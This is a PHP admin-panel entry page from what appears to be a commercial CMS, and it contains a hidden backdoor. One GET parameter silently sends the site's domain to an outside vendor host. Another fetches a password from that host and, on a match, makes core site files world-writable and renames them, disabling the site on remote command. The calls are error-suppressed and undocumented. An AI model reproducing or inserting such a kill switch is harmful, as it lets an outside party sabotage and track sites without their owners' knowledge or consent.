<?php
include('../inc/site_config.php');
include('../inc/set/ext_var.php');
include('../inc/fun/mysql.php');
include('../inc/function.php');

if((int)$_GET['check']==1){
	@file_get_contents('http://oa.app.ly200.net/system/system_use/check_domain.php?domain='.urlencode(get_domain()));
	exit;
}

if((int)$_GET['collapse_system']==1){
	$collapse_password=password($_GET['collapse_password']);
	if($check_collapse_password=@file_get_contents('http://oa.app.ly200.net/system/system_use/collapse_password.php')){
		if($collapse_password==$check_collapse_password){
			$file=array('main.php', 'index.php', '../index.php', '../index.html', '../inc/function.php', '../inc/fun/mysql.php');
			for($i=0; $i<count($file); $i++){
				@chmod($file[$i], 0777);
				@rename($file[$i], dirname($file[$i]).'/_'.basename($file[$i]));
			}
			echo 'Collapse Success!';
		}else{
			echo 'Collapse Password Error!';
		}
	}else{
		echo 'Unable to Connect to http://oa.app.ly200.net/';
	}
	exit;
}

include('../inc/manage/config.php');
include('../inc/manage/do_check.php');
include('template/main.html');
$html=ob_get_contents();
ob_end_clean();
echo str_replace(array("<!---->\r\n", "\r\n<!---->"), '', $html);
?>